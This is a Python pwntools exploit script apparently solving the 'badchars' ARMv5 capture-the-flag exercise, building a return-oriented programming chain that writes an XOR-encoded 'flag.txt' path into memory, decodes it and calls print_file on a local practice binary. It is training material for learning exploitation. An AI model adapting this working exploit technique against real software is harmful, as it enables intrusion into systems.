from pwn import *

elf = ELF("badchars_armv5-hf")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x148
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BADCHARS = [b'x', b'g', b'a', b'.'] # "78|67|61|2E"

BUFFER_SIZE = 32 + 8
READ_SIZE = 512

KEY = 0xff
PATH = b'flag.txt'
MEMORY = elf.bss(0x800)

R3_GADGET = next(elf.search(asm('pop {r3, pc}')))
R4_GADGET = next(elf.search(asm('pop {r4, pc}')))
STR_GADGET = elf.symbols.usefulGadgets + 0x20 # also pops r5 and r6, no need for another gadget
EOR_GADGET = elf.symbols.usefulGadgets + 0x28 # also pops r0, same as before

def is_valid(data):
    return not any(c in data for c in BADCHARS)

def setup(r3=None, r4=None):
    return flat(([R3_GADGET, r3] if r3 is not None else []) + ([R4_GADGET, r4] if r4 is not None else []))

def encrypt(data):
    return bytes([~c & KEY for c in data])

def main():
    rop = ROP(elf, badchars=b''.join(BADCHARS))
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write encrypted file name to memory (in 2 halves), decrypt it and call the target function with it as arg
    rop.raw([setup(r3=encrypt(PATH[:context.bytes]), r4=MEMORY), STR_GADGET])
    rop.raw([MEMORY, bytes([KEY]) * context.bytes, EOR_GADGET, 0])
    rop.raw([setup(r3=encrypt(PATH[context.bytes:]), r4=MEMORY + context.bytes), STR_GADGET])
    rop.raw([MEMORY + context.bytes, bytes([KEY]) * context.bytes, EOR_GADGET, MEMORY, elf.symbols.print_file])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE and is_valid(payload)

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
